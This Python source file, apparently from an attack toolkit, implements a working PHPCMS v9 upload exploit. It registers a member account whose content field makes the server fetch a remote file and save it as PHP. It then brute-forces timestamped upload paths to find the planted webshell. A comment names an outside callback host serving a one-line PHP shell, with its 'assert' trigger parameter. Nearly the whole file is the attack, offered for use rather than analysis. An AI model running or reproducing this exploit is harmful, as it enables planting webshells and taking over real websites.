# -*- coding:utf-8 -*-
import requests
import sys
import time
from datetime import datetime, timedelta


class Cmsexp(object):
    def __init__(self, url, func, data):
        self.url = url
        self.func = func
        self.data = data

    # 静态方法只是名义上归属类管理，但是不能使用类变量和实例变量，是类的工具包 放在函数前（该函数不传入self或者cls），所以不能访问类属性和实例属性
    @staticmethod
    def getTime():
        year = str(datetime.now().year)
        month = "%02d" % datetime.now().month
        day = "%02d" % datetime.now().day
        hour = datetime.now().hour
        hour = hour - 12 if hour > 12 else hour
        hour = "%02d" % hour
        minute = "%02d" % datetime.now().minute
        second = "%02d" % datetime.now().second
        microsecond = "%06d" % datetime.now().microsecond
        microsecond = microsecond[:3]
        nowTime = year + month + day + hour + minute + second + microsecond
        return int(nowTime), year + "/" + month + day + "/"

    @staticmethod
    def getGMT(t):
        # 实现Date: Mon, 04 May 2020 17:14:00 GMT 时间类型的转换
        # TIME = 'Mon, 04 May 2020 15:22:31 GMT'
        # https://www.jianshu.com/p/9af83e147527 python的time模块,以及12小时制与24小时制转换(时间转换) %I
        TIME = t
        GMT_FORMAT = '%a, %d %b %Y %H:%M:%S GMT'  # 2020-05-04 15:22:31
        T2 = datetime.strptime(TIME, GMT_FORMAT)

        # 转回本地时区 +8
        localtime = T2 + timedelta(hours=8)
        # 转为数组并且格式化时间格式为(20200504232231)   Y%m%d%H%M%S  =>  Y%m%d%I%M%S  使用%I ,12 小时制，一天的第几个小时
        otherStyleTime = time.strftime("%Y%m%d%I%M%S", time.strptime(str(localtime), "%Y-%m-%d %H:%M:%S"))
        # print(otherStyleTime)
        return int(otherStyleTime)

    def phpcmsv9_sqlinject(self):
        pass

    def phpcmsv9_upload(self, result):
        host = self.url
        fileurl = self.data
        url = host + "/index.php?m=member&c=index&a=register&siteid=1"
        # print(host)
        # print(url)

        data = {
            "siteid": "1",
            "modelid": "1",
            "username": "dsakkfaffdssdudi",
            "password": "123456",
            "email": "dsakkfddsjdi@qq.com",
            # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0
            "info[content]": "<img src=%s?.php#.jpg>" % fileurl,
            "dosubmit": "1",
            "protocol": "",
        }

        try:
            # 方法1  在服务器和本地时间一致的情况下使用
            startTime, _ = self.getTime()
            htmlContent = requests.post(url, data=data, timeout=2)
            finishTime, dateUrl = self.getTime()
            # 方法2 如果有Date响应头， 获取服务器返回字段来计算时间
            servertime = self.getGMT(htmlContent.headers['Date'])
            servertime2 = int(str(servertime) + '999')
            servertime = int(str(servertime) + '000')
            # print(servertime)
            # print(servertime2)

            # 试图同步时间
            # les = abs(servertime - startTime)
            # print(les)
            # finishTime = finishTime - les
            # startTime  = startTime -les
            # print("startTime", startTime)
            # print("servetime", servertime)
            # print("finisTime", finishTime)

            if "MySQL Error" in htmlContent.text and "http" in htmlContent.text:
                successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php"
                # print("[+]Shell  : %s" % successUrl)
                result.append("[+] Exploited Success,Shell: %s" % successUrl)
            else:
                # print(
                #     "[-]Notice : writing remoteShell successfully, but failing to get the echo. You can wait the "
                #     "program crawl the uploadfile(in 1-3 second)，or re-run the program after modifying value of "
                #     "username and email.\n")

                successUrl = ""

                # 利用服务器返回信息爆破
                for t in range(servertime, servertime2):
                    checkUrlHtml = requests.get(host + "/uploadfile/" + dateUrl + str(t) + ".php")
                    # print(host + "/uploadfile/" + dateUrl + str(t) + ".php")
                    if checkUrlHtml.status_code == 200 and 'PHPCMS' not in checkUrlHtml.text:
                        successUrl = host + "/uploadfile/" + dateUrl + str(t) + ".php"
                        # print("[*]Shell  : %s" % successUrl)
                        result.append("[+] The Target is vuln. Exploited Success\n[+] Shell: %s" % successUrl)
                        break
                # 利用本地时间进行轮询爆破
                if successUrl == "":
                    for t in range(startTime, finishTime + 999):
                        checkUrlHtml = requests.get(host + "/uploadfile/" + dateUrl + str(t) + ".php")
                        # print(host + "/uploadfile/" + dateUrl + str(t) + ".php")
                        if checkUrlHtml.status_code == 200 and 'PHPCMS' not in checkUrlHtml.text:
                            successUrl = host + "/uploadfile/" + \
                                         dateUrl + str(t) + ".php"
                            # print("[*]Shell  : %s" % successUrl)
                            result.append("[+] The Target is vuln. Exploited Success\n[+] Shell: %s" % successUrl)
                            break
                        else:
                            # print("[-] Failed : had crawled all possible url, but i can't find out it. So it's failed.\n")
                            result.append("[-] Failed : had crawled all possible url, but i can't find out it. So it's failed.\n")
                            result.append("[-] This target not vuln.")
                            break

        except BaseException as e:
            # print("Request Error")
            # print(e)
            result.append(str(e))
            sys.exit()

    def start(self, result):
        try:
            # print(result)
            # print("self." + self.func)
            eval("self." + self.func)(result)
        except BaseException as e:
            result.append(str(e))


if __name__ == '__main__':
    pass
